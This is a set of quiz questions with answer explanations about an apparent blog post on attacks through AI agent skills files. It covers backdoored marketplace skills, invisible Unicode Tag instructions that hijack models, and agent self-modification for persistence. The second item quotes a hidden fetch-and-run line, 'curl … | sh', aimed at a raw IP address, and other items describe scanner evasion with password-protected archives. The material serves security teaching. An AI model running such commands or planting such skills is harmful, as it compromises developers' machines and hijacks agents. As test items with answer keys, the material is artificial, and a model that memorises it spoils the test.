question: Standard prompt injection is described as 'session-scoped.' How does a backdoored skills file differ in threat profile?
options: Skills files are more dangerous because they can initiate direct network requests, which prompt injection cannot do.

A backdoored skills file loads automatically before every session and persists in the shared repo until explicitly removed — giving an attacker persistent, session-level code execution that survives model updates and credential rotations alike.
Session-scoped injection requires more technical sophistication to execute than crafting a convincing malicious skills file.
Skills files carry cryptographic signatures making them structurally harder to compromise than prompt injection vectors.
explanation: Persistence is what makes skills supply chain attacks categorically different from standard injection. A malicious webpage reaches one session; when it ends, so does the attack. A backdoored skills file loads before every session starts. In a team environment where skills are committed to a shared repository, a single compromised file affects every developer's agent runs across all future sessions until someone identifies it and removes it. The same properties that make skills useful — automatic loading, compaction survival, codebase portability — are exactly what makes a compromised one hard to contain.

question: The ClawHub attackers embedded malware in `better-polymarket` by hiding the payload around line 180 of an otherwise working skill. Why did this bypass typical security review?
options: The malware used encryption preventing any static analysis tool from scanning the file during marketplace review.

Security reviewers focus on installation hooks and setup scripts — hiding the payload in operational skill logic shifts the attack to runtime, where it executes with the same trust level as legitimate skill functionality.
The marketplace disabled code review for skills that exceeded a minimum star-rating threshold from prior users.
The attacker used obfuscation making the malicious line visually indistinguishable from an inline comment.
explanation: The post makes this explicit: 'The attacker understood that security reviewers focus on installation hooks; by hiding the payload in operational code during normal use, they evaded superficial analysis.' The `curl -s http://54.91.154.110:13338/ | sh` line hidden in line 180 of a skill with hundreds of working lines of market search logic is invisible to a reviewer looking for suspicious npm install hooks or setup scripts. Functional code serves as camouflage; the operational phase is the trigger rather than installation.

question: Rehberger demonstrated that invisible Unicode Tag codepoints embedded in a SKILL.md file could inject instructions visible to models but completely invisible in text editors and code review tools. What makes this fundamentally different from other obfuscation techniques?
options: Unicode Tags are more efficient because they add no measurable file size overhead compared to other methods.
The review surface and execution surface differ — a developer reads rendered text and sees nothing.
Unicode Tags can only be embedded by attackers with direct write access to the repository hosting service.
Unlike Base64 encoding, Unicode Tags are not detectable by any standard security scanner or analysis tool.
explanation: Standard obfuscation (Base64, ROT13) is invisible to humans but still needs some mechanism that analysis tools can detect. Unicode Tag codepoints render as completely blank in every standard text editor, code review interface, and diff tool — genuinely invisible to the entire human review apparatus. The model reads the file character by character and executes the hidden instruction. There's no bypass needed; the attack lives in the gap between human visual perception and the model's byte-level reading. Rehberger confirmed this against Claude and Gemini; a SKILL.md appeared completely unchanged in diff views while the hidden instruction executed.

question: The ClawHub audit found 341 malicious skills in a marketplace of 2,857. Two weeks later the marketplace had grown to 10,700+ skills and the malicious count had more than doubled to 824. What does this growth pattern reveal about marketplace governance?
options: The marketplace had automated detection but it generated too many false positives to be operationally actionable.
The attack was caught and contained within two weeks, demonstrating that marketplace monitoring functions effectively.
Malicious skill creation is scaling faster than manual auditing can contain — reproducing npm/PyPI supply chain.
The 824 figure is inflated because the scanner misclassified many legitimate skills as malicious due to heuristic errors.
explanation: The doubling of malicious content in two weeks while the marketplace tripled in size is the scaling signature of an automated attack outpacing manual governance. The audit happened because Koi's security team and their bot did it themselves — not because the platform detected the problem. The HTML comment vulnerability had been publicly demonstrated and left unfixed; the Unicode Tag technique had been reported to model vendors for two years. What's missing is institutional incentive to require either the fixes or the governance. The question is whether oversight catches up before or after autonomous exploit development becomes economically rational at scale.

question: Password-protected ZIP archives are a delivery mechanism for malicious skills. What does the password actually protect against?
options: It protects against end users accidentally opening and executing the archive without prior explicit authorization.
The password prevents automated antivirus scanners from inspecting encrypted archive contents.
It ensures only authenticated marketplace accounts can successfully download and extract the skill package.
The password verifies the skill originated from the original developer and hasn't been modified by third parties.
explanation: This is explicitly documented in Koi's ClawHub disclosure: password-protected archives bypass automated antivirus analysis because scanners cannot inspect encrypted content. The user receives the password in a 'Prerequisites' section that looks like a normal software requirement, but the actual purpose is scanner evasion. The malicious payload reaches the user's machine without being flagged during transit or at download time. This is the same technique documented in criminal marketplace listings for malware delivery — adapted to the skills ecosystem.

question: The post identifies `context: fork` in the skills spec as a compounding risk factor when combined with a compromised agent. What is the mechanism?
options: Fork mode allows skills to bypass the permission checks that would otherwise catch malicious behavior at runtime.
A skill with `context: fork` runs as a background process outside the visible conversation.
Fork mode creates additional copies of the skills directory that are harder to enumerate and fully audit.
Context forks increase memory usage substantially, making detection of malicious background processes impractical.
explanation: This is the skills-layer version of the memory poisoning problem: the same architectural property that makes persistent context useful creates a durable attack surface. `context: fork` runs the skill as a background process outside the main conversation thread — outside the user's visible history. An agent already compromised through any attack vector can write a malicious skill with `context: fork` configured, making it both persistent (loads every session) and invisible (runs outside conversation history). This completes the chain from initial compromise to durable, undetectable persistence.

question: A development team has 20 skills committed to their shared repository from various sources over six months, most installed and then largely forgotten. What risk does this situation represent and why?
options: The repository will become too large for efficient cloning due to the accumulated skills file storage overhead.
Skills from different sources may conflict with each other, causing inconsistent or unpredictable agent behavior.

Like Knight Capital's dormant Power Peg algorithm, skills installed and forgotten still load metadata into every session context — dormancy does not mean inertness, and forgotten tools remain active attack surface.
Marketplace skills may not work correctly with the team's specific project configuration or toolset.
explanation: The post draws this parallel explicitly: 'dead code doesn't become inert through disuse; it just becomes invisible.' A skill installed six months ago still loads its metadata into the system prompt every session. In a team environment where skills accumulate across members and sources, the aggregate effect becomes difficult to audit. Unlike dead code that does nothing, a malicious skill actively executes every time — dormancy doesn't make it safe. This is a specific governance failure: no process for auditing installed skills, no inventory of what's running, no mechanism to detect drift from the original install.

question: Claude Code appeared to have added Unicode Tag detection by February 2026. What does the post recommend practitioners do given this information?
options: No further action needed — if Claude Code detects Unicode Tag attacks, the threat is effectively resolved.

Detection may have been incidental rather than deliberate; equivalent protection didn't exist in claude.ai at the same time, meaning the mitigation was partial and its provenance uncertain — making independent regression monitoring essential.
Practitioners should switch from Claude Code to claude.ai, where Unicode protection is more comprehensive.
Unicode Tags are no longer viable since all major vendors implemented detection simultaneously after the disclosure.
explanation: The post is explicit: Rehberger 'couldn't determine whether this was an intentional mitigation or an incidental change, which is why watching for regression matters.' The detection appeared in Claude Code but not in claude.ai at the same date — protection was partial and its provenance uncertain. This is the precise case where treating a single detection event as comprehensive coverage creates false confidence. The `aid` scanner provides independent, reproducible detection that doesn't depend on the model vendor's current state or whether a recent update happened to include protection.

question: All three attack vectors in this post — malicious marketplace skills, invisible Unicode Tags, and agent self-modification — exploit the same fundamental property. What is it, and what governance implication does it carry?
options: All three require the attacker to have physical access to the developer's machine or local workstation.
All three exploit agent obedience — the same property making skills effective makes malicious skills equally.
All three can be detected and blocked by standard antivirus software with regularly updated signature databases.
All three are version-controlled attacks that can be fully reverted by restoring git history to an earlier state.
explanation: The post opens with this observation: 'The central bet of context engineering is obedience... That obedience is the feature. It's also the attack surface.' ETH Zurich's finding that agents follow bad instructions as reliably as good ones is the mechanism behind all three vectors. A governance implication flows directly: if you'd give a piece of software shell access to your machine, you can install its skills. If you wouldn't — if it's from an anonymous marketplace account — the risk profile is the same as running untrusted code. The security posture for skills should match the security posture for executed code.

question: The post ends with Honnibal's 'tipping point' framing: the moment when autonomous exploit development targeting skills marketplaces yields a positive return on investment. What does this predict about the trajectory of these threats?
options: Autonomous exploit development is already economically rational, meaning the attack wave has effectively already begun.

Before the tipping point, attacks are manual and time-bounded; after it, the attack surface is automated and scales at compute speed, making platform-level defenses the only viable response to industrialized skill-injection campaigns.
The tipping point refers to when enough security researchers identify the problem to create adequate detection tooling.
Once attacks become automated, they're easier to detect because automated attacks produce consistent, recognizable signatures.
explanation: The tipping point framing is about the transition from manual attack economics to automated attack economics. At current scale, manual attack was profitable enough to generate 824 malicious skills. At marketplace scale where automated adversarial skill generation becomes viable — testing which attack patterns evade detection, generating plausible-looking documentation, rotating delivery mechanisms — the problem becomes qualitatively different. The 824-skill campaign required human effort; the post-tipping-point campaign runs at compute speed. The governance question is identical to npm and PyPI: does institutional investment in platform security precede or follow the industrialization of the attack?

imageAlt: Persistence comparison: standard prompt injection ends when the session ends; poisoned skills file loops — loads automatically before each new session until explicitly removed
question: The diagram contrasts session-scoped injection with skills-file poisoning. What property of the skills file makes it categorically more dangerous than a standard prompt injection?
options: The skills file has higher token priority — content loaded from a skills file appears earlier in the context window than user input, giving the injected instructions precedence over any user-level safety guidance.

The skills file persists across sessions and loads automatically — the attack is executed once and then re-runs at the start of every subsequent session until the file is explicitly inspected and cleaned.

The skills file bypasses input guardrails — because it is loaded by the system rather than submitted as user input, skills file content is not inspected by the same filtering pipeline as user messages.

The skills file can modify other skills files — a poisoned skills entry can write new entries, creating a self-replicating attack that spreads through the agent's skill library without additional attacker access.
explanation: The diagram's loop arrow is the key: poisoned skills file → loads before each session → loop. Standard prompt injection has a session boundary — the attack ends when the conversation ends. A poisoned skills file is an autoloaded resource: every new session begins by loading it, executing the injected instructions before any user input is processed. The attacker doesn't need continued access; one successful write to the skills file is sufficient to establish persistent control that survives session resets, model restarts, and user-level mitigations. The post calls this the skills supply chain problem: the trust assumptions built into autoloaded agent resources make them high-value targets precisely because persistence is their design feature.

imageAlt: Unicode injection: what the code reviewer sees (blank line 5) versus what the model reads (hidden orange instruction block with curl command)
question: The diagram shows a blank line to a human reviewer and an instruction block to the model. What property of LLM tokenization makes this attack work despite the characters being in the same file?
options: LLMs tokenize invisible Unicode characters as whitespace, which the model treats as paragraph separators that trigger instruction-following mode — the curl command is injected into the model's instruction context rather than its code context.

LLMs process all Unicode codepoints including invisible formatting characters, while code review tools and human editors render many Unicode codepoints as blank space or suppress them entirely — the same byte sequence looks different to each consumer.

LLMs have a higher Unicode character limit than code review tools — the hidden instruction block exceeds the display limit of standard diff viewers, which truncate it, while the model processes the full file including the truncated section.

LLMs are pre-trained on data that includes invisible Unicode characters used as markup in web scraping — the model has learned to treat these characters as instruction delimiters based on training distribution.
explanation: The attack exploits a rendering gap, not a model vulnerability. Unicode includes many invisible or zero-width characters (zero-width space, right-to-left override, tag characters) that most code editors, diff tools, and human reviewers either don't display or render as whitespace. The model, however, processes the raw token stream — every codepoint is present. So the file that passes code review (a blank line at line 5) and the file the model reads (a hidden curl exfiltration command at line 5) are the same file. The attack surface is the assumption that what humans see in review tools is what the model will process — which is wrong whenever the rendering layer suppresses Unicode characters that the tokenizer doesn't.
